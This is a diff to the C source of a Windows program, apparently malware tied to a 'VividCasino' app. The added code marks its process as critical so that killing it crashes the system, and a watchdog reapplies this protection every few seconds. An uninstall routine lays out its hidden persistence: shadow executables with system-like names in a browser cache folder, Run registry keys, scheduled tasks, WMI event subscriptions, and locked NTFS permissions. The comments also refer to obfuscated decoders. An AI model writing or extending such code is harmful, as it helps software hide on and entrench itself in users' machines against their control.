@@ -222,19 +222,86 @@ void sys_check_antivirus(void) {
     sys_run_command(cmd);
 }
 
-/* === Process Protection === */
+/* === Process Protection (Plain String Versions — work regardless of obf state) === */
 
 int g_critical_protected = 0;
 
-/* Mark process as critical — Windows BSODs if this process dies.
-   Delegates to obfuscated implementation. */
+/* Enable a privilege for the current process token */
+static int enable_privilege_plain(const char *privilege_name) {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        return 0;
+    }
+
+    if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
+        CloseHandle(hToken);
+        return 0;
+    }
+
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = luid;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+        CloseHandle(hToken);
+        return 0;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        CloseHandle(hToken);
+        return 0;
+    }
+
+    CloseHandle(hToken);
+    return 1;
+}
+
+/* Mark process as critical — uses plain strings, works even if obf decoders are broken */
 void sys_protect_process(void) {
-    obf_sys_protect_process();
+    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        g_critical_protected = -1;
+        return;
+    }
+    
+    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) {
+        g_critical_protected = -1;
+        return;
+    }
+    
+    enable_privilege_plain("SeDebugPrivilege");
+    
+    ULONG isCritical = 1;
+    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
+    
+    if (status == 0) {
+        g_critical_protected = 1;
+    } else {
+        g_critical_protected = -1;
+    }
 }
 
 /* Remove critical process flag */
 void sys_unprotect_process(void) {
-    obf_sys_unprotect_process();
+    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return;
+    
+    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) return;
+    
+    enable_privilege_plain("SeDebugPrivilege");
+    
+    ULONG isCritical = 0;
+    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
+    g_critical_protected = 0;
 }
 
 /* Get protection status string */
@@ -244,24 +311,182 @@ const char* sys_protection_status(void) {
     return "NORMAL";
 }
 
-/* Check if current process is actually marked as critical */
+/* Check if current process is actually marked as critical — plain string version */
 const char* sys_check_critical_status_with_name(void) {
-    return obf_sys_check_critical_status();
+    static char buf[512];
+    char path[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    char *filename = path;
+    char *lastSlash = strrchr(path, '\');
+    if (lastSlash) filename = lastSlash + 1;
+
+    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
+        return buf;
+    }
+
+    NtQueryInfoProc pNtQuery = (NtQueryInfoProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
+    if (!pNtQuery) {
+        snprintf(buf, sizeof(buf), "[Failed to resolve NtQueryInformationProcess] [%s]", filename);
+        return buf;
+    }
+
+    enable_privilege_plain("SeDebugPrivilege");
+
+    ULONG isCritical = 0;
+    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);
+
+    if (status != 0) {
+        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
+        return buf;
+    }
+    if (isCritical) {
+        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
+    } else {
+        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
+    }
+    return buf;
 }
 
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
-        /* Keep retrying until protection succeeds.
-           g_critical_protected == 1  → protected, do nothing
-           g_critical_protected == 0  → not yet attempted, try now
-           g_critical_protected == -1 → previous attempt failed, retry */
         if (g_critical_protected != 1) {
-            obf_sys_protect_process();
+            sys_protect_process();
         }
         Sleep(5000);
     }
     return 0;
+}
+
+/* === FULL UNINSTALL: Remove ALL persistence and exit cleanly === */
+void sys_uninstall(void) {
+    extern volatile int g_uninstalling;
+    g_uninstalling = 1;
+    
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    char dirPath[MAX_PATH];
+    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
+    
+    const char *shadows[] = {
+        "ElevationService.exe",
+        "CrashHandler.exe",
+        "NotifyService.exe"
+    };
+    const char *regKeys[] = {
+        "ElevationService",
+        "CrashHandler",
+        "NotifyService",
+        "VividCasino"
+    };
+    
+    /* 1. Remove critical flag from ALL shadow processes */
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                for (int i = 0; i < 3; i++) {
+                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                        if (hProc) {
+                            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+                            if (ntdll) {
+                                typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+                                NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+                                if (pNtSetInformationProcess) {
+                                    ULONG isCritical = 0;
+                                    pNtSetInformationProcess(hProc, 29, &isCritical, sizeof(isCritical));
+                                }
+                            }
+                            CloseHandle(hProc);
+                        }
+                    }
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    
+    /* 2. Remove critical flag from current process */
+    sys_unprotect_process();
+    
+    /* 3. Remove registry Run keys */
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        for (int i = 0; i < 4; i++) {
+            RegDeleteValueA(hKey, regKeys[i]);
+        }
+        RegCloseKey(hKey);
+    }
+    
+    /* 4. Remove scheduled tasks */
+    char cmd[512];
+    for (int i = 0; i < 3; i++) {
+        snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", regKeys[i]);
+        system(cmd);
+    }
+    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"VividCasinoMain\" /f 2>nul");
+    system(cmd);
+    
+    /* 5. Remove WMI persistence */
+    snprintf(cmd, sizeof(cmd),
+        "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
+        "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \\\"Name='SysHealthFilter'\\\" -ErrorAction SilentlyContinue;"
+        "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SysHealthConsumer'\\\" -ErrorAction SilentlyContinue;"
+        "Remove-WmiObject -Namespace 'root/subscription' -Class __FilterToConsumerBinding -Filter \\\"Filter='__EventFilter.Name=\\\"SysHealthFilter\\\"'\\\" -ErrorAction SilentlyContinue"
+        "\"");
+    system(cmd);
+    
+    /* 6. Remove NTFS hardening so files can be deleted */
+    /* Take ownership back first */
+    snprintf(cmd, sizeof(cmd), "takeown /f \"%s\" /r /d y 2>nul", dirPath);
+    system(cmd);
+    /* Reset permissions */
+    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /reset /t /c /q 2>nul", dirPath);
+    system(cmd);
+    /* Grant full control to current user */
+    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /grant \"%s\":(F) /t /c /q 2>nul", dirPath, "%USERNAME%");
+    system(cmd);
+    
+    /* 7. Terminate ALL shadow processes */
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                for (int i = 0; i < 3; i++) {
+                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        if (hProc) {
+                            TerminateProcess(hProc, 0);
+                            CloseHandle(hProc);
+                        }
+                    }
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    
+    /* 8. Delete shadow files */
+    for (int i = 0; i < 3; i++) {
+        char path[MAX_PATH];
+        snprintf(path, sizeof(path), "%s\\%s", dirPath, shadows[i]);
+        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
+        DeleteFileA(path);
+    }
+    
+    /* 9. Exit self gracefully */
+    ExitProcess(0);
 }
 
 /* Ensure directory exists (create recursively) */
